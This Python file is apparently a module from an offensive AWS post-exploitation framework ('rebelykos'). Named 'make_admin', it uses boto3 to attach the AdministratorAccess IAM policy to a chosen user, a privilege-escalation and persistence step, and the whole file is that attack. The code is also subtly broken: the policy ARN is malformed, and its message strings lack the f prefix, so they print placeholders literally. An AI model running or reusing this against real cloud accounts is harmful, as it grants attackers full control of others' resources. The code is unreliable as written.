import boto3

from rebelykos.core.response import Response as res
from rebelykos.core.teamserver.module import Module


class RLModule(Module):
    def __init__(self):
        super().__init__()
        self.name = "make_admin"
        self.description = "Attach the builtin admin policy to specified user"
        self.author = "Takahiro Yokoyama"
        self.options["user"] = {
            "Description": "User to attach admin policy",
            "Required": True,
            "Value": ""
        }

    def run(self):
        result = []
        client = boto3.client("iam", **self["profile"])
        resp = self._handle_err(client.attach_user_policy,
                                UserName=self["user"],
                                PolicyArn=("arn:aws:iam:policy/"
                                           "AdministratorAccess"))
        if resp[-1][0] == res.RESULT:
            result.append((res.GOOD,
                           "Adding admin policy to: {self['user']}"))
            result.append(
                (res.INFO,
                 ("Response to attaching admin policy was"
                  ": {resp[-1][1]['ResponseMetadata']['HTTPStatusCode']}"))
            )
        else:
            result.extend(resp)
        return result

